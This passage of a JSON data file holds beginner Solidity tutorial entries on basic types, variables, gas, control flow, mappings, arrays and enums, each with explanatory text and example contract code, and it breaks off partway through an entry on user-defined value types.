[
  {
    "slug": "hello-world",
    "title": "Hello World",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Hello world in Solidity",
    "content": "`pragma` specifies the compiler version of Solidity.\n\n```solidity\n// SPDX-License-Identifier: MIT\n// compiler version must be greater than or equal to 0.8.26 and less than 0.9.0\npragma solidity ^0.8.26;\n\ncontract HelloWorld {\n    string public greet = \"Hello World!\";\n}\n\n```",
    "codes": [
      {
        "fileName": "HelloWorld.sol",
        "code": "// SPDX-License-Identifier: MIT\n// compiler version must be greater than or equal to 0.8.26 and less than 0.9.0\npragma solidity ^0.8.26;\n\ncontract HelloWorld {\n    string public greet = \"Hello World!\";\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "contract",
      "app",
      "application",
      "hello",
      "world"
    ],
    "order": 0
  },
  {
    "slug": "first-app",
    "title": "First Application",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of smart contract in Solidity",
    "content": "Here is a simple contract that you can get, increment and decrement the count stored in this contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Counter {\n    uint256 public count;\n\n    // Function to get the current count\n    function get() public view returns (uint256) {\n        return count;\n    }\n\n    // Function to increment count by 1\n    function inc() public {\n        count += 1;\n    }\n\n    // Function to decrement count by 1\n    function dec() public {\n        // This function will fail if count = 0\n        count -= 1;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Counter.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Counter {\n    uint256 public count;\n\n    // Function to get the current count\n    function get() public view returns (uint256) {\n        return count;\n    }\n\n    // Function to increment count by 1\n    function inc() public {\n        count += 1;\n    }\n\n    // Function to decrement count by 1\n    function dec() public {\n        // This function will fail if count = 0\n        count -= 1;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "contract",
      "contracts",
      "app",
      "first",
      "application",
      "counter"
    ],
    "order": 1
  },
  {
    "slug": "primitives",
    "title": "Primitive Data Types",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Primitive data types",
    "content": "Here we introduce you to some primitive data types available in Solidity.\n\n- `boolean`\n- `uint256`\n- `int256`\n- `address`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Primitives {\n    bool public boo = true;\n\n    /*\n    uint stands for unsigned integer, meaning non negative integers\n    different sizes are available\n        uint8   ranges from 0 to 2 ** 8 - 1\n        uint16  ranges from 0 to 2 ** 16 - 1\n        ...\n        uint256 ranges from 0 to 2 ** 256 - 1\n    */\n    uint8 public u8 = 1;\n    uint256 public u256 = 456;\n    uint256 public u = 123; // uint is an alias for uint256\n\n    /*\n    Negative numbers are allowed for int types.\n    Like uint, different ranges are available from int8 to int256\n    \n    int256 ranges from -2 ** 255 to 2 ** 255 - 1\n    int128 ranges from -2 ** 127 to 2 ** 127 - 1\n    */\n    int8 public i8 = -1;\n    int256 public i256 = 456;\n    int256 public i = -123; // int is same as int256\n\n    // minimum and maximum of int\n    int256 public minInt = type(int256).min;\n    int256 public maxInt = type(int256).max;\n\n    address public addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;\n\n    /*\n    In Solidity, the data type byte represent a sequence of bytes. \n    Solidity presents two types of bytes :\n\n     - fixed-sized byte arrays\n     - dynamically-sized byte arrays.\n     \n     The term bytes in Solidity represents a dynamic array of bytes. \n     It’s a shorthand for byte[] .\n    */\n    bytes1 a = 0xb5; //  [10110101]\n    bytes1 b = 0x56; //  [01010110]\n\n    // Default values\n    // Unassigned variables have a default value\n    bool public defaultBoo; // false\n    uint256 public defaultUint; // 0\n    int256 public defaultInt; // 0\n    address public defaultAddr; // 0x0000000000000000000000000000000000000000\n}\n\n```",
    "codes": [
      {
        "fileName": "Primitives.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Primitives {\n    bool public boo = true;\n\n    /*\n    uint stands for unsigned integer, meaning non negative integers\n    different sizes are available\n        uint8   ranges from 0 to 2 ** 8 - 1\n        uint16  ranges from 0 to 2 ** 16 - 1\n        ...\n        uint256 ranges from 0 to 2 ** 256 - 1\n    */\n    uint8 public u8 = 1;\n    uint256 public u256 = 456;\n    uint256 public u = 123; // uint is an alias for uint256\n\n    /*\n    Negative numbers are allowed for int types.\n    Like uint, different ranges are available from int8 to int256\n    \n    int256 ranges from -2 ** 255 to 2 ** 255 - 1\n    int128 ranges from -2 ** 127 to 2 ** 127 - 1\n    */\n    int8 public i8 = -1;\n    int256 public i256 = 456;\n    int256 public i = -123; // int is same as int256\n\n    // minimum and maximum of int\n    int256 public minInt = type(int256).min;\n    int256 public maxInt = type(int256).max;\n\n    address public addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;\n\n    /*\n    In Solidity, the data type byte represent a sequence of bytes. \n    Solidity presents two types of bytes :\n\n     - fixed-sized byte arrays\n     - dynamically-sized byte arrays.\n     \n     The term bytes in Solidity represents a dynamic array of bytes. \n     It’s a shorthand for byte[] .\n    */\n    bytes1 a = 0xb5; //  [10110101]\n    bytes1 b = 0x56; //  [01010110]\n\n    // Default values\n    // Unassigned variables have a default value\n    bool public defaultBoo; // false\n    uint256 public defaultUint; // 0\n    int256 public defaultInt; // 0\n    address public defaultAddr; // 0x0000000000000000000000000000000000000000\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "primitive",
      "primitives",
      "data",
      "type",
      "types",
      "variable",
      "variables",
      "boolean",
      "uint256",
      "int256",
      "address",
      "uint",
      "int"
    ],
    "order": 2
  },
  {
    "slug": "variables",
    "title": "Variables",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Local, state and global variables",
    "content": "There are 3 types of variables in Solidity\n\n- **local**\n  - declared inside a function\n  - not stored on the blockchain\n- **state**\n  - declared outside a function\n  - stored on the blockchain\n- **global** (provides information about the blockchain)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Variables {\n    // State variables are stored on the blockchain.\n    string public text = \"Hello\";\n    uint256 public num = 123;\n\n    function doSomething() public view {\n        // Local variables are not saved to the blockchain.\n        uint256 i = 456;\n\n        // Here are some global variables\n        uint256 timestamp = block.timestamp; // Current block timestamp\n        address sender = msg.sender; // address of the caller\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Variables.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Variables {\n    // State variables are stored on the blockchain.\n    string public text = \"Hello\";\n    uint256 public num = 123;\n\n    function doSomething() public view {\n        // Local variables are not saved to the blockchain.\n        uint256 i = 456;\n\n        // Here are some global variables\n        uint256 timestamp = block.timestamp; // Current block timestamp\n        address sender = msg.sender; // address of the caller\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "variable",
      "variables",
      "local",
      "global",
      "state",
      "data"
    ],
    "order": 3
  },
  {
    "slug": "constants",
    "title": "Constants",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Constant variables",
    "content": "Constants are variables that cannot be modified.\n\nTheir value is hard coded and using constants can save gas cost.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Constants {\n    // coding convention to uppercase constant variables\n    address public constant MY_ADDRESS =\n        0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc;\n    uint256 public constant MY_UINT = 123;\n}\n\n```",
    "codes": [
      {
        "fileName": "Constants.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Constants {\n    // coding convention to uppercase constant variables\n    address public constant MY_ADDRESS =\n        0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc;\n    uint256 public constant MY_UINT = 123;\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "constant",
      "constants",
      "data",
      "variable",
      "variables"
    ],
    "order": 4
  },
  {
    "slug": "immutable",
    "title": "Immutable",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Immutable variables",
    "content": "Immutable variables are like constants. Values of immutable variables can be set inside the constructor but cannot be modified afterwards.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Immutable {\n    address public immutable myAddr;\n    uint256 public immutable myUint;\n\n    constructor(uint256 _myUint) {\n        myAddr = msg.sender;\n        myUint = _myUint;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Immutable.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Immutable {\n    address public immutable myAddr;\n    uint256 public immutable myUint;\n\n    constructor(uint256 _myUint) {\n        myAddr = msg.sender;\n        myUint = _myUint;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "constant",
      "constants",
      "immutable",
      "immutables",
      "data",
      "variable",
      "variables"
    ],
    "order": 5
  },
  {
    "slug": "state-variables",
    "title": "Reading and Writing to a State Variable",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Reading and Writing to a State Variable",
    "content": "To write or update a state variable you need to send a transaction.\n\nOn the other hand, you can read state variables, for free, without any transaction fee.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract SimpleStorage {\n    // State variable to store a number\n    uint256 public num;\n\n    // You need to send a transaction to write to a state variable.\n    function set(uint256 _num) public {\n        num = _num;\n    }\n\n    // You can read from a state variable without sending a transaction.\n    function get() public view returns (uint256) {\n        return num;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "SimpleStorage.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract SimpleStorage {\n    // State variable to store a number\n    uint256 public num;\n\n    // You need to send a transaction to write to a state variable.\n    function set(uint256 _num) public {\n        num = _num;\n    }\n\n    // You can read from a state variable without sending a transaction.\n    function get() public view returns (uint256) {\n        return num;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "reading",
      "writing",
      "state",
      "variable",
      "variables",
      "app",
      "application"
    ],
    "order": 6
  },
  {
    "slug": "ether-units",
    "title": "Ether and Wei",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of Ether and Wei in Solidity",
    "content": "Transactions are paid with `ether`.\n\nSimilar to how one dollar is equal to 100 cents, one `ether` is equal to 10<sup>18</sup> `wei`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract EtherUnits {\n    uint256 public oneWei = 1 wei;\n    // 1 wei is equal to 1\n    bool public isOneWei = (oneWei == 1);\n\n    uint256 public oneGwei = 1 gwei;\n    // 1 gwei is equal to 10^9 wei\n    bool public isOneGwei = (oneGwei == 1e9);\n\n    uint256 public oneEther = 1 ether;\n    // 1 ether is equal to 10^18 wei\n    bool public isOneEther = (oneEther == 1e18);\n}\n\n```",
    "codes": [
      {
        "fileName": "EtherUnits.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract EtherUnits {\n    uint256 public oneWei = 1 wei;\n    // 1 wei is equal to 1\n    bool public isOneWei = (oneWei == 1);\n\n    uint256 public oneGwei = 1 gwei;\n    // 1 gwei is equal to 10^9 wei\n    bool public isOneGwei = (oneGwei == 1e9);\n\n    uint256 public oneEther = 1 ether;\n    // 1 ether is equal to 10^18 wei\n    bool public isOneEther = (oneEther == 1e18);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "variables",
      "variable",
      "ether",
      "wei",
      "units"
    ],
    "order": 7
  },
  {
    "slug": "gas",
    "title": "Gas",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of gas and gas limit in Solidity",
    "content": "### How much `ether` do you need to pay for a transaction?\n\nYou pay `gas spent * gas price` amount of `ether`, where\n\n- `gas` is a unit of computation\n- `gas spent` is the total amount of `gas` used in a transaction\n- `gas price` is how much `ether` you are willing to pay per `gas`\n\nTransactions with higher gas price have higher priority to be included in a block.\n\nUnspent gas will be refunded.\n\n### Gas Limit\n\nThere are 2 upper bounds to the amount of gas you can spend\n\n- `gas limit` (max amount of gas you're willing to use for your transaction, set by you)\n- `block gas limit` (max amount of gas allowed in a block, set by the network)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Gas {\n    uint256 public i = 0;\n\n    // Using up all of the gas that you send causes your transaction to fail.\n    // State changes are undone.\n    // Gas spent is not refunded.\n    function forever() public {\n        // Here we run a loop until all of the gas are spent\n        // and the transaction fails\n        while (true) {\n            i += 1;\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Gas.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Gas {\n    uint256 public i = 0;\n\n    // Using up all of the gas that you send causes your transaction to fail.\n    // State changes are undone.\n    // Gas spent is not refunded.\n    function forever() public {\n        // Here we run a loop until all of the gas are spent\n        // and the transaction fails\n        while (true) {\n            i += 1;\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "gas"
    ],
    "order": 8
  },
  {
    "slug": "if-else",
    "title": "If / Else",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "If / Else conditional statement in Solidity",
    "content": "Solidity supports conditional statements `if`, `else if` and `else`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract IfElse {\n    function foo(uint256 x) public pure returns (uint256) {\n        if (x < 10) {\n            return 0;\n        } else if (x < 20) {\n            return 1;\n        } else {\n            return 2;\n        }\n    }\n\n    function ternary(uint256 _x) public pure returns (uint256) {\n        // if (_x < 10) {\n        //     return 1;\n        // }\n        // return 2;\n\n        // shorthand way to write if / else statement\n        // the \"?\" operator is called the ternary operator\n        return _x < 10 ? 1 : 2;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "IfElse.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract IfElse {\n    function foo(uint256 x) public pure returns (uint256) {\n        if (x < 10) {\n            return 0;\n        } else if (x < 20) {\n            return 1;\n        } else {\n            return 2;\n        }\n    }\n\n    function ternary(uint256 _x) public pure returns (uint256) {\n        // if (_x < 10) {\n        //     return 1;\n        // }\n        // return 2;\n\n        // shorthand way to write if / else statement\n        // the \"?\" operator is called the ternary operator\n        return _x < 10 ? 1 : 2;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "if",
      "else",
      "conditional",
      "statement",
      "statements"
    ],
    "order": 9
  },
  {
    "slug": "loop",
    "title": "For and While Loop",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of for and while loop in Solidity",
    "content": "Solidity supports `for`, `while`, and `do while` loops.\n\nDon't write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.\n\nFor the reason above, `while` and `do while` loops are rarely used.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Loop {\n    function loop() public pure {\n        // for loop\n        for (uint256 i = 0; i < 10; i++) {\n            if (i == 3) {\n                // Skip to next iteration with continue\n                continue;\n            }\n            if (i == 5) {\n                // Exit loop with break\n                break;\n            }\n        }\n\n        // while loop\n        uint256 j;\n        while (j < 10) {\n            j++;\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Loop.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Loop {\n    function loop() public pure {\n        // for loop\n        for (uint256 i = 0; i < 10; i++) {\n            if (i == 3) {\n                // Skip to next iteration with continue\n                continue;\n            }\n            if (i == 5) {\n                // Exit loop with break\n                break;\n            }\n        }\n\n        // while loop\n        uint256 j;\n        while (j < 10) {\n            j++;\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "for",
      "loop",
      "loops",
      "while",
      "do"
    ],
    "order": 10
  },
  {
    "slug": "mapping",
    "title": "Mapping",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of using mapping in Solidity",
    "content": "Maps are created with the syntax `mapping(keyType => valueType)`.\n\nThe `keyType` can be any built-in value type, bytes, string, or any contract.\n\n`valueType` can be any type including another mapping or an array.\n\nMappings are not iterable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Mapping {\n    // Mapping from address to uint\n    mapping(address => uint256) public myMap;\n\n    function get(address _addr) public view returns (uint256) {\n        // Mapping always returns a value.\n        // If the value was never set, it will return the default value.\n        return myMap[_addr];\n    }\n\n    function set(address _addr, uint256 _i) public {\n        // Update the value at this address\n        myMap[_addr] = _i;\n    }\n\n    function remove(address _addr) public {\n        // Reset the value to the default value.\n        delete myMap[_addr];\n    }\n}\n\ncontract NestedMapping {\n    // Nested mapping (mapping from address to another mapping)\n    mapping(address => mapping(uint256 => bool)) public nested;\n\n    function get(address _addr1, uint256 _i) public view returns (bool) {\n        // You can get values from a nested mapping\n        // even when it is not initialized\n        return nested[_addr1][_i];\n    }\n\n    function set(address _addr1, uint256 _i, bool _boo) public {\n        nested[_addr1][_i] = _boo;\n    }\n\n    function remove(address _addr1, uint256 _i) public {\n        delete nested[_addr1][_i];\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Mapping.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Mapping {\n    // Mapping from address to uint\n    mapping(address => uint256) public myMap;\n\n    function get(address _addr) public view returns (uint256) {\n        // Mapping always returns a value.\n        // If the value was never set, it will return the default value.\n        return myMap[_addr];\n    }\n\n    function set(address _addr, uint256 _i) public {\n        // Update the value at this address\n        myMap[_addr] = _i;\n    }\n\n    function remove(address _addr) public {\n        // Reset the value to the default value.\n        delete myMap[_addr];\n    }\n}\n\ncontract NestedMapping {\n    // Nested mapping (mapping from address to another mapping)\n    mapping(address => mapping(uint256 => bool)) public nested;\n\n    function get(address _addr1, uint256 _i) public view returns (bool) {\n        // You can get values from a nested mapping\n        // even when it is not initialized\n        return nested[_addr1][_i];\n    }\n\n    function set(address _addr1, uint256 _i, bool _boo) public {\n        nested[_addr1][_i] = _boo;\n    }\n\n    function remove(address _addr1, uint256 _i) public {\n        delete nested[_addr1][_i];\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "variable",
      "variables",
      "mapping"
    ],
    "order": 11
  },
  {
    "slug": "array",
    "title": "Array",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Learn about arrays in Solidity",
    "content": "An array can have a compile-time fixed size or a dynamic size.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Array {\n    // Several ways to initialize an array\n    uint256[] public arr;\n    uint256[] public arr2 = [1, 2, 3];\n    // Fixed sized array, all elements initialize to 0\n    uint256[10] public myFixedSizeArr;\n\n    function get(uint256 i) public view returns (uint256) {\n        return arr[i];\n    }\n\n    // Solidity can return the entire array.\n    // But this function should be avoided for\n    // arrays that can grow indefinitely in length.\n    function getArr() public view returns (uint256[] memory) {\n        return arr;\n    }\n\n    function push(uint256 i) public {\n        // Append to array\n        // This will increase the array length by 1.\n        arr.push(i);\n    }\n\n    function pop() public {\n        // Remove last element from array\n        // This will decrease the array length by 1\n        arr.pop();\n    }\n\n    function getLength() public view returns (uint256) {\n        return arr.length;\n    }\n\n    function remove(uint256 index) public {\n        // Delete does not change the array length.\n        // It resets the value at index to it's default value,\n        // in this case 0\n        delete arr[index];\n    }\n\n    function examples() external pure {\n        // create array in memory, only fixed size can be created\n        uint256[] memory a = new uint256[](5);\n\n        // create a nested array in memory\n        // b = [[1, 2, 3], [4, 5, 6]]\n        uint256[][] memory b = new uint256[][](2);\n        for (uint256 i = 0; i < b.length; i++) {\n            b[i] = new uint256[](3);\n        }\n        b[0][0] = 1;\n        b[0][1] = 2;\n        b[0][2] = 3;\n        b[1][0] = 4;\n        b[1][1] = 5;\n        b[1][2] = 6;\n    }\n}\n\n```\n\n### Examples of removing an array element\n\nRemove an array element by shifting elements from right to left\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ArrayRemoveByShifting {\n    // [1, 2, 3] -- remove(1) --> [1, 3, 3] --> [1, 3]\n    // [1, 2, 3, 4, 5, 6] -- remove(2) --> [1, 2, 4, 5, 6, 6] --> [1, 2, 4, 5, 6]\n    // [1, 2, 3, 4, 5, 6] -- remove(0) --> [2, 3, 4, 5, 6, 6] --> [2, 3, 4, 5, 6]\n    // [1] -- remove(0) --> [1] --> []\n\n    uint256[] public arr;\n\n    function remove(uint256 _index) public {\n        require(_index < arr.length, \"index out of bounds\");\n\n        for (uint256 i = _index; i < arr.length - 1; i++) {\n            arr[i] = arr[i + 1];\n        }\n        arr.pop();\n    }\n\n    function test() external {\n        arr = [1, 2, 3, 4, 5];\n        remove(2);\n        // [1, 2, 4, 5]\n        assert(arr[0] == 1);\n        assert(arr[1] == 2);\n        assert(arr[2] == 4);\n        assert(arr[3] == 5);\n        assert(arr.length == 4);\n\n        arr = [1];\n        remove(0);\n        // []\n        assert(arr.length == 0);\n    }\n}\n\n```\n\nRemove an array element by copying last element into to the place to remove\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ArrayReplaceFromEnd {\n    uint256[] public arr;\n\n    // Deleting an element creates a gap in the array.\n    // One trick to keep the array compact is to\n    // move the last element into the place to delete.\n    function remove(uint256 index) public {\n        // Move the last element into the place to delete\n        arr[index] = arr[arr.length - 1];\n        // Remove the last element\n        arr.pop();\n    }\n\n    function test() public {\n        arr = [1, 2, 3, 4];\n\n        remove(1);\n        // [1, 4, 3]\n        assert(arr.length == 3);\n        assert(arr[0] == 1);\n        assert(arr[1] == 4);\n        assert(arr[2] == 3);\n\n        remove(2);\n        // [1, 4]\n        assert(arr.length == 2);\n        assert(arr[0] == 1);\n        assert(arr[1] == 4);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Array.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Array {\n    // Several ways to initialize an array\n    uint256[] public arr;\n    uint256[] public arr2 = [1, 2, 3];\n    // Fixed sized array, all elements initialize to 0\n    uint256[10] public myFixedSizeArr;\n\n    function get(uint256 i) public view returns (uint256) {\n        return arr[i];\n    }\n\n    // Solidity can return the entire array.\n    // But this function should be avoided for\n    // arrays that can grow indefinitely in length.\n    function getArr() public view returns (uint256[] memory) {\n        return arr;\n    }\n\n    function push(uint256 i) public {\n        // Append to array\n        // This will increase the array length by 1.\n        arr.push(i);\n    }\n\n    function pop() public {\n        // Remove last element from array\n        // This will decrease the array length by 1\n        arr.pop();\n    }\n\n    function getLength() public view returns (uint256) {\n        return arr.length;\n    }\n\n    function remove(uint256 index) public {\n        // Delete does not change the array length.\n        // It resets the value at index to it's default value,\n        // in this case 0\n        delete arr[index];\n    }\n\n    function examples() external pure {\n        // create array in memory, only fixed size can be created\n        uint256[] memory a = new uint256[](5);\n\n        // create a nested array in memory\n        // b = [[1, 2, 3], [4, 5, 6]]\n        uint256[][] memory b = new uint256[][](2);\n        for (uint256 i = 0; i < b.length; i++) {\n            b[i] = new uint256[](3);\n        }\n        b[0][0] = 1;\n        b[0][1] = 2;\n        b[0][2] = 3;\n        b[1][0] = 4;\n        b[1][1] = 5;\n        b[1][2] = 6;\n    }\n}\n"
      },
      {
        "fileName": "ArrayRemoveByShifting.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ArrayRemoveByShifting {\n    // [1, 2, 3] -- remove(1) --> [1, 3, 3] --> [1, 3]\n    // [1, 2, 3, 4, 5, 6] -- remove(2) --> [1, 2, 4, 5, 6, 6] --> [1, 2, 4, 5, 6]\n    // [1, 2, 3, 4, 5, 6] -- remove(0) --> [2, 3, 4, 5, 6, 6] --> [2, 3, 4, 5, 6]\n    // [1] -- remove(0) --> [1] --> []\n\n    uint256[] public arr;\n\n    function remove(uint256 _index) public {\n        require(_index < arr.length, \"index out of bounds\");\n\n        for (uint256 i = _index; i < arr.length - 1; i++) {\n            arr[i] = arr[i + 1];\n        }\n        arr.pop();\n    }\n\n    function test() external {\n        arr = [1, 2, 3, 4, 5];\n        remove(2);\n        // [1, 2, 4, 5]\n        assert(arr[0] == 1);\n        assert(arr[1] == 2);\n        assert(arr[2] == 4);\n        assert(arr[3] == 5);\n        assert(arr.length == 4);\n\n        arr = [1];\n        remove(0);\n        // []\n        assert(arr.length == 0);\n    }\n}\n"
      },
      {
        "fileName": "ArrayReplaceFromEnd.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ArrayReplaceFromEnd {\n    uint256[] public arr;\n\n    // Deleting an element creates a gap in the array.\n    // One trick to keep the array compact is to\n    // move the last element into the place to delete.\n    function remove(uint256 index) public {\n        // Move the last element into the place to delete\n        arr[index] = arr[arr.length - 1];\n        // Remove the last element\n        arr.pop();\n    }\n\n    function test() public {\n        arr = [1, 2, 3, 4];\n\n        remove(1);\n        // [1, 4, 3]\n        assert(arr.length == 3);\n        assert(arr[0] == 1);\n        assert(arr[1] == 4);\n        assert(arr[2] == 3);\n\n        remove(2);\n        // [1, 4]\n        assert(arr.length == 2);\n        assert(arr[0] == 1);\n        assert(arr[1] == 4);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "variable",
      "variables",
      "array",
      "arrays"
    ],
    "order": 12
  },
  {
    "slug": "enum",
    "title": "Enum",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of enums in Solidity",
    "content": "Solidity supports enums and they are useful to model choice and keep track of state.\n\nEnums can be declared outside of a contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Enum {\n    // Enum representing shipping status\n    enum Status {\n        Pending,\n        Shipped,\n        Accepted,\n        Rejected,\n        Canceled\n    }\n\n    // Default value is the first element listed in\n    // definition of the type, in this case \"Pending\"\n    Status public status;\n\n    // Returns uint\n    // Pending  - 0\n    // Shipped  - 1\n    // Accepted - 2\n    // Rejected - 3\n    // Canceled - 4\n    function get() public view returns (Status) {\n        return status;\n    }\n\n    // Update status by passing uint into input\n    function set(Status _status) public {\n        status = _status;\n    }\n\n    // You can update to a specific enum like this\n    function cancel() public {\n        status = Status.Canceled;\n    }\n\n    // delete resets the enum to its first value, 0\n    function reset() public {\n        delete status;\n    }\n}\n\n```\n\n### Declaring and importing Enum\n\nFile that the enum is declared in\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n// This is saved 'EnumDeclaration.sol'\n\nenum Status {\n    Pending,\n    Shipped,\n    Accepted,\n    Rejected,\n    Canceled\n}\n\n```\n\nFile that imports the enum above\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./EnumDeclaration.sol\";\n\ncontract Enum {\n    Status public status;\n}\n\n```",
    "codes": [
      {
        "fileName": "Enum.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Enum {\n    // Enum representing shipping status\n    enum Status {\n        Pending,\n        Shipped,\n        Accepted,\n        Rejected,\n        Canceled\n    }\n\n    // Default value is the first element listed in\n    // definition of the type, in this case \"Pending\"\n    Status public status;\n\n    // Returns uint\n    // Pending  - 0\n    // Shipped  - 1\n    // Accepted - 2\n    // Rejected - 3\n    // Canceled - 4\n    function get() public view returns (Status) {\n        return status;\n    }\n\n    // Update status by passing uint into input\n    function set(Status _status) public {\n        status = _status;\n    }\n\n    // You can update to a specific enum like this\n    function cancel() public {\n        status = Status.Canceled;\n    }\n\n    // delete resets the enum to its first value, 0\n    function reset() public {\n        delete status;\n    }\n}\n"
      },
      {
        "fileName": "EnumDeclaration.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n// This is saved 'EnumDeclaration.sol'\n\nenum Status {\n    Pending,\n    Shipped,\n    Accepted,\n    Rejected,\n    Canceled\n}\n"
      },
      {
        "fileName": "EnumImport.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./EnumDeclaration.sol\";\n\ncontract Enum {\n    Status public status;\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "variable",
      "variables",
      "enum",
      "import",
      "imports"
    ],
    "order": 13
  },
  {
    "slug": "user-defined-value-types",
    "title": "User Defined Value Types",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "User defined value types",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Code copied from optimism\n// https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/src/dispute/lib/LibUDT.sol\n\ntype Duration is uint64;\n\ntype Timestamp is uint64;\n\ntype Clock is uint128;\n\nlibrary LibClock {\n    function wrap(Duration _duration, Timestamp _timestamp)\n        internal\n        pure\n        returns (Clock clock_)\n    {\n        assembly {\n            // data | Duration | Timestamp\n            // bit  | 0 ... 63 | 64 ... 127\n            clock_ := or(shl(0x40, _duration), _timestamp)\n        }\n    }\n\n    function duration(Clock _clock)\n        internal\n        pure\n        returns (Duration duration_)\n    {\n        assembly {\n            duration_ := shr(0x40, _clock)\n        }\n    }\n\n    function timestamp(Clock _clock)\n        internal\n        pure\n        returns (Timestamp timestamp_)\n    {\n        assembly {\n            timestamp_ := shr(0xC0, shl(0xC0, _clock))\n        }\n    }\n}\n\n// Clock library without user defined value type\nlibrary LibClockBasic {\n    function wrap(uint64 _duration, uint64 _timestamp)\n        internal\n        pure\n        returns (uint128 clock)\n    {\n        assembly {\n            clock := or(shl(0x40, _duration), _timestamp)\n        }\n    }\n}\n\ncontract Examples {\n    function example_no_uvdt() 